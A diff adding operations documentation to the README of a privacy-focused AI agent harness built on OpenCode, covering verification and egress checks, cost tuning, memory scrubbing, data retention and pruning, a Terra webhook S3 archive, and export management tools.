+In the app, **⇧⌘R** (View or Harness → Reload Auth) restarts the service and
+reloads once healthy. Plain **⌘R** does it too whenever the secrets file is
+newer than the running server, so a page reload cannot silently keep an old
+token; the title bar shows `secrets changed (⇧⌘R)` while that is true.
+
+`zdr-harness status` and `reload-auth` print the live secrets path and a
+length plus SHA-256 prefix per key. Those fingerprints are how you tell an edit
+landed in the file the server actually reads — comparing them against the
+running process is the check that catches a token edited in the wrong file:
+
+```sh
+ps -Eww -p "$(pgrep -f 'opencode.exe serve')" | tr ' ' '\n' |
+  grep '^KICKOFF_POSTHOG_TOKEN=' | cut -d= -f2- | shasum -a 256 | cut -c1-12
+```
+
+`zdr-harness set-token <KEY>` is the alternative to an editor: hidden prompt,
+one line rewritten in place, restart and re-check, fingerprint printed.
+
+## Upgrading OpenCode
+
+Deliberately only. Read the release notes (watch for the V2 core and the
+Responses WebSocket / `previous_response_id` path), then:
+
+1. `npm i --prefix ~/.zdr-harness/opt opencode-ai@<version>` and bump
+   `OPENCODE_VERSION` in the wrapper.
+2. Re-check the source for new config dirs, npm installs, telemetry or proxies.
+3. Re-run every step in **Verification**.
+
+## Verification
+
+Run all of these after setup and after any upgrade or change to the wrapper,
+config or app.
+
+1. **Key isolation.** `ps -Eww -p "$(pgrep -f 'opencode.exe serve')" | tr ' ' '\n' | grep -c _API_KEY=` → `1`,
+   and its SHA-256 prefix matches the ZDR key in 1Password, not `launchctl getenv OPENAI_API_KEY`.
+2. **Effective state** (authenticated `curl` with `x-opencode-directory: ~/.zdr-harness/work`):
+   `GET /config/providers` → only `openai`; `GET /agent` → `zdr` plus hidden
+   `compaction`/`summary`/`title`; `GET /mcp` → all three `connected`; no auth →
+   `401`. Then ask one aggregate question per server: `connected` does not prove
+   the credential works.
+3. **Tool denial.** Ask it to read `/etc/hosts` and run `ls` → no tool parts in
+   the reply, and it says it has no such tools.
+4. **Egress.** Sample `lsof -nP -iTCP -a -p <pid>` across a restart and a prompt
+   that uses both MCP servers. Allowed: `api.openai.com`, `mcp.amplitude.com`,
+   `bugsnag.mcp.smartbear.com`, `oauth.bugsnag.com`, `mcp.slack.com`. Anything else (npm
+   `104.16.x.34`, `*.opencode.ai`, GitHub, PostHog, Sentry) is a failure.
+5. **ZDR probe.** A Responses call with `store: true` using the harness key must
+   return `store: false`, and fetching the response ID must return 404.
+6. **End to end.** `zdr_ask` an aggregate question from Claude Code, ask a
+   follow-up with the same `session_id`, and open the session in the app.
+7. **App build.** `zdr-harness app-build --force`, then
+   `codesign --verify --deep --strict ~/Applications/ZDR\ Harness.app`, and grep
+   the bundle (including `strings` of the binary) for the first 16 characters of
+   the password and 24 of the key → 0 hits.
+8. **App self-test.** Start a loopback listener that logs every connection on a
+   spare port, run `--self-test --canary-port <port>` and
+   `--self-test --canary-port <port> --session <id>` → `allPass` and an empty
+   listener log.
+9. **App egress.** With the app open on a session while a prompt streams, sample
+   `lsof -nP -iTCP -a -p` for `ZDRHarness` and its `com.apple.WebKit.*`
+   processes (the ones holding `com.taylor.zdr-harness.app` files) → only
+   `127.0.0.1:4096` (plus the self-test's own loopback canary if one is running).
+10. **Lambda logs.** `list_groups` returns only production groups, and a
+    staging group name is refused by the server rather than by AWS.
+11. **App failure states.** `launchctl bootout gui/$(id -u)/com.taylor.zdr-harness`,
+    run `--self-test-recovery` → `allPass`, then `zdr-harness status` healthy.
+
+## Cost
+
+The harness pays API rates for every token, and its callers are agents that
+are themselves waiting, so it is tuned to spend where the answer changes and
+nowhere else — with quality winning any conflict. Measured over the first 51
+sessions (2026-09-17 → 24, all on `gpt-5.5`): 5.9M fresh input tokens, 61M
+cache-read tokens, 272k output, 232k reasoning — roughly $75, and **half of it
+was cache reads**: every turn re-sends the whole context, and the context was
+mostly old tool output the agent never looked at again. The largest outputs
+were Amplitude taxonomy dumps (17k chars mean, 50k max), BugSnag `get_error`
+(17k mean) and `list_project_errors` × 184 calls, and one `get-tx-reference`
+at 47k.
+
+What that bought, in `opencode.json` and the prompts:
+
+- `compaction.prune: true` drops old tool outputs from the context once they
+  are behind the conversation; `compaction.auto` stays on. Compaction
+  summaries are written by `gpt-5.4-mini` (`agent.compaction.model`), not the
+  main model.
+- `variant: medium` on both agents pins reasoning effort at the model
+  default rather than letting it drift; `low` is a one-word change if the
+  answers stay good, `high` if they do not. `steps: 60` caps tool iterations
+  per turn — one early session took 261 calls, which is a lost agent, not a
+  thorough one.
+- The prompts' "Working style" now says how to be cheap without being wrong:
+  memory first, small `perPage`/`limit`, aggregate in the query, one
+  well-formed query over three exploratory ones, stop when answered, tight
+  answers, and write the shape that worked to memory so the next session
+  skips the exploration.
+- Memory is reconciled, not just appended. The store was consolidated on
+  2026-09-24 from nine topics of dated fragments into six dense ones (one per
+  system) with the obsolete Cloudinary notes removed; the originals are in
+  `~/.zdr-harness/memory-archive/`. The prompts ask the agent to write
+  corrections into the same topic so a stale entry cannot be acted on.
+
+Measured the same day on two identical questions, before and after (gpt-5.5
+list prices; cache reads at a tenth of input):
+
+| Question | Before | After | Change |
+|---|---|---|---|
+| Calls/day vs generate-call-notes errors (DB + CloudWatch) | 24k in, 229k cache, 5 turns, 22k chars of tool output — ≈ $0.31 | 8k in, 282k cache, 6 turns, 6k chars — ≈ $0.25 | −65% fresh input |
+| 14-day call rate by coach caseload band (DB, 3 joins) | 36k in, 688k cache, 13 turns, 11 queries — ≈ $0.60 | 23k in, 369k cache, 8 turns, 4 queries — ≈ $0.35 | −41% |
+
+The second answer was identical and named the exact flag columns; the first
+was *more* correct after: the baseline had reported hundreds of errors a day
+that an Insights count over the same window could not reproduce (one line in
+seven days), and the harness memory now says so. Efficiency came from memory
+(the exact log group and the joins were already known) and from fewer, better
+formed queries, not from thinner reasoning.
+
+Sessions record tokens per assistant message; repeat the measure from
+`GET /session/{id}/message` (`info.tokens`, and tool parts' `state.output`).
+
+## Memory
+
+`~/.zdr-harness/memory/` is the part meant to last: one Markdown file per topic,
+written through `harness_memory_write` and read with `harness_memory_search`,
+`harness_memory_list` and `harness_memory_read`. Both agents share it, so a
+query shape worked out in the app is there for a relayed question later.
+
+Memory outlives the data it came from, so the server scrubs every note on the
+way in — emails, phone numbers, UUIDs and `user_id:`-style codes become
+placeholders — and both prompts say to record the pattern, not the person.
+Prune never touches it.
+
+## Data retention
+
+`~/.zdr-harness/xdg/data/opencode/opencode.db` and `log/` keep full sessions,
+including raw Amplitude, BugSnag, PostHog and CloudWatch output, on this Mac.
+
+- **Sessions prune at 14 days.** `com.taylor.zdr-harness-prune` runs
+  `zdr-harness prune` daily at 03:30 and logs to `~/.zdr-harness/logs/prune.log`.
+  Run it by hand with `zdr-harness prune [--days N]`, `--dry-run` first.
+- **The store is kept private.** `zdr-harness serve` chmods
+  `xdg/data/opencode` to 700 and `opencode.db*` to 600 on every start, because
+  OpenCode creates them 755/644. This stops other accounts, not another process
+  running as you — the harness, the app and every coding agent share one uid, so
+  there is no hard boundary here by design.
+- **Tell your other agents to stay out.** A `Read(~/.zdr-harness/**)` deny rule
+  in Claude Code and its Codex equivalent costs nothing and turns an accidental
+  read into a refusal. Those are your config files, so they are not set here.
+- Sessions that touched the production database go after 7 days instead of
+  14: `prune` fetches each candidate's messages and looks for a `kickoffdb_*`
+  tool part.
+- Exports (`~/.zdr-harness/exports`: transcript exports, fixture packages,
+  source pages, review files) are **kept until archived**. An archived export
+  is deleted 7 days after archiving (`--archive-days`); see Exports below.
+- Classifier jobs started here (`~/.zdr-harness/classifier/jobs`) go after 7
+  days (`--db-days`); the classifier's jobs from other harnesses go after 14
+  (`--days`). Its profiles are kept, like memory.
+- Memory under `~/.zdr-harness/memory/` is deliberately exempt from all of this.
+
+## Terra webhook payloads
+
+`kickoffdb_terra_payload_days`, `kickoffdb_terra_payload_get`,
+`kickoffdb_terra_scopes_export` and `kickoffdb_terra_scopes_export_status`
+read the raw Terra webhook archive (`kickoff-terra-event-payloads-production`,
+us-west-1). Code is in `mcps/kickoff-db/terra-payloads.mjs`, with tests
+against a fake S3 in `test/terra-payloads.test.mjs`.
+
+**Why it exists.** A wearable connection's granted scopes are not stored in
+the database. They exist only in the payloads, as `user.scopes`.
+
+**The data.**
+- The bucket keeps 30 days (lifecycle rule `expire-terra-payloads`): about
+  3.8 TB and 6.2M objects.
+- Encryption is SSE-S3, so the policy needs no KMS statement.
+- Keys look like `production/<YYYY-MM-DD>/<uuid>.json`.
+- Every payload pairs a Kickoff client id (`user.reference_id`) with health
+  data.
+
+**Walls.**
+- The bucket, the `production/` prefix and the key shape are fixed in code
+  before any request is made.
+- IAM grants `s3:ListBucket` on prefix `production/*` and `s3:GetObject` on
+  `production/*` only (`iam/zdr-harness-policy.json`, statements
+  `ListTerraEventPayloads` and `ReadTerraEventPayloads`).
+- A single payload read is capped at 5 MB.
+
+**The scopes export.**
+- It reads newest day first and smallest objects first, keeping each Terra
+  user's latest provider, scopes, active flag and last event.
+- It stops at `target_users`, `max_objects` (default 50,000), or after
+  `saturation` objects in a row bring no new user. It never downloads the
+  bucket.
+- It writes a `ts_<id>.jsonl` export (kept until archived) and returns stats
+  only.
+- Scopes are always empty for APPLE, MYFITNESSPAL, CRONOMETER, PELOTON and
+  COROS.
+
+Stored data rows stay database questions (`terra_users`,
+`client_integration_*`).
+
+## Terra archive
+
+The bucket deletes payloads after 30 days, and a day of them is larger than
+this Mac's free disk. The archive keeps the part only the payloads hold, for
+good, in `~/.zdr-harness/archives/terra-payloads/archive.db` (SQLite, 700/600;
+it holds Terra user ids, Kickoff reference ids and connection events, so treat
+it like an export). Code: `mcps/kickoff-db/terra-archive.mjs` (engine),
+`terra-archive-cli.mjs` (runner), tests in `test/terra-archive.test.mjs`.
+
+**What it keeps.** For every payload it reads only the first 4 KB (HTTP
+Range); the `type` and `user` block always sit there, with a 64 KB and then a
+full read as fallbacks.
+- `user_states`: one row per distinct provider, scopes and active state of a
+  connection, with first and last seen. This is the scope history.
+- `user_day`: events and bytes per user, day and event type.
+- `conn_events`: connection events in full (auth, deauth, user_reauth,
+  permission_change, connection_error, access_revoked).
+- Health data itself is not kept; stored rows are in the database already.
+
+**How a run works.**
+- Oldest unfinished day first, because it expires first.
+- Each day is listed, then only keys not yet done are fetched. Days inside the
+  overlap window (default 3) are re-listed on every run to catch late keys.
+- A day older than the window with nothing pending is sealed: its key list is
+  dropped and it is never listed again.
+- Concurrency starts at 32, grows by 8 after 200 straight successes up to 128,
+  and halves on SlowDown, 5xx, 429 or connection errors. Each request retries
+  3 times with jittered backoff. A key that fails for any other reason gets one
+  try per run and is counted failed after 5 runs.
+- A run stops cleanly at its time budget, under 15 GB free disk, or on
+  SIGTERM, and the next run resumes where it stopped. One run at a time (PID
+  lock in the archive directory).
+- AccessDenied stops the run at once with the IAM pointer.
+
+**What it survives (2026-10-14).** Every commit is a SQLite transaction, so a
+run can die at any point and lose at most the batch in flight.
+- *Network outage:* every request has a 30 s deadline (60 s for a list page),
+  headers and body included, so a stalled socket fails instead of hanging. A
+  payload still failing on the network after its retries is deferred, left
+  pending with no attempt counted. When nothing gets through, the run pauses
+  and probes S3 (15 s, 30 s … 5 min), resumes when it answers and resets
+  concurrency, and ends as "network down" after 20 minutes without an answer.
+  A key that keeps failing while others succeed counts as failed after 3
+  deferrals, so one bad object cannot loop.
+- *Crash, kill, sleep, reboot:* the lock records the boot session and its
+  process, so a lock left by a dead process or a previous boot is ignored. A
+  run left "running" is marked crashed by the next run or tick. A watchdog
+  ends a run that makes no progress for 10 minutes; the next tick resumes it.
+- *Repeated trouble:* troubled runs (failed, crashed, network down, watchdog)
+  back off 15 min, 30, 60 … up to 4 h, and 6 h after AccessDenied, which
+  needs a human.
+
+**Running it.**
+- The LaunchAgent `com.taylor.zdr-harness-terra-archive` runs
+  `terra-archive tick` every 30 minutes and at login, under `caffeinate -i`
+  (`src/launchd/`). The tick decides from the archive itself (`decideTick` in
+  `terra-archive.mjs`): it runs when days are unsealed (catching up), when the
+  last complete pass is over 6 h old (refresh), or when a backoff has expired,
+  each with a 120-minute budget. Otherwise it exits in well under a second
+  with no network call, so a current archive costs nothing.
+- `zdr-harness terra-archive status | runs | log [run_id] | tick | start | stop | run [--max-minutes N --overlap-days N --days d1,d2] | export`.
+  `status` leads with a `health` line: current, due, running, backing off
+  (with the next try), paused at the disk floor, or "scheduler silent" when no
+  tick has run for 2 h.
+- Harness tools: `terra_archive_status`, `terra_archive_start`,
+  `terra_archive_scopes_export` (writes a `ts_` export).
+
+**Watching it.** Every run writes `~/.zdr-harness/logs/terra-archive/<run_id>.jsonl`:
+start, each day listed, progress per 2,000 objects (rate, retries, throttles,
+concurrency), concurrency changes, sealed days, and an end line with the
+summary and stop reason, plus outage, watchdog and reconcile events. The last
+tick's decision is in `tick.json` beside them. Logs hold counts, days and error
+codes only, never ids, and are kept 30 days. `terra-archive runs` gives one line per run, which is the place to spot
+a needed change (repeated throttling, a budget that never finishes, failures).
+
+## Exports
+
+Since 2026-10-12 the `exports` MCP (`mcps/exports/`) manages everything the
+tools write under `~/.zdr-harness/exports`. It never reads contents.
+
+| Tool | Does |
+|---|---|
+| `exports_list` | id, kind, status, absolute path, size, files, last change, and the deletion date of archived ones |
+| `exports_archive` | marks exports archived; the nightly prune deletes them 7 days later |
+| `exports_unarchive` | returns them to active (kept indefinitely) |
+| `exports_delete` | deletes now |
+
+- **Kinds:** `tx_` transcript exports, `fp_` fixture packages, `sp_` source
+  pages, `rv_` operational-review files. Nothing else can be touched;
+  unknown files are listed as unmanaged at most. Fixture release receipts
+  live outside exports, root-owned, in
+  `/Library/Application Support/zdr-harness/fixture-approvals/`
+  (`zdr-harness approve`).
+- **Bulk and idempotent:** every write takes `ids` (up to 5000) or a `select`
+  filter (`kind`, `status`, `modified_before`), plus `dry_run`. Archiving
+  something already archived, or deleting something already gone, reports
+  that and changes nothing.
+- **How archiving works:** it is a marker in `exports/.state/archive.json`,
+  written atomically under a lock. Nothing moves, so package paths stay
+  valid.
+- **Safety:** symlinks are refused and paths are confined to the root. Tests
+  are in `mcps/exports/test/`.
+- **From a shell:** `zdr-harness exports list|archive|unarchive|delete|prune`
+  does the same.
+- **Handing an export to Taylor:** when an outside agent asks for an export
+  through `zdr_ask`, the bridge answers with its id and path for Taylor to
+  open (`open -R "<path>"`), never its contents.
+- **Keeping agents out:** Claude Code denies its file tools under
+  `~/.zdr-harness/exports`; the global agent rules say the same for shells
+  and Codex. A shell running as Taylor can still read the folder, so this is
+  a guard against accidental reads, not a sandbox.
+
+## Call Guidance fixture package tool
+
+`kickoffdb_fixture_package` supplies Data Loader's missing protected writer.
+It is explicitly allowed for both ZDR agents; built-in shell and arbitrary
+file/edit tools remain denied. See [tool workflow](mcps/kickoff-db/FIXTURE-PACKAGES.md).
+The production database remains read-only. Package creation is a local,
+protected staging write and does not authorize exporting clinical data.
+
+Data Loader also has fixed pinned contract/source access, exact call ordinals,
+local-day/nutrition helpers, bounded full-cell source capture, shared catalogs
+and durable chunk/checkpoint recovery. The direct analyst has 240 steps; the
+bridge agent retains 60. See the workflow above for limits and review gates.
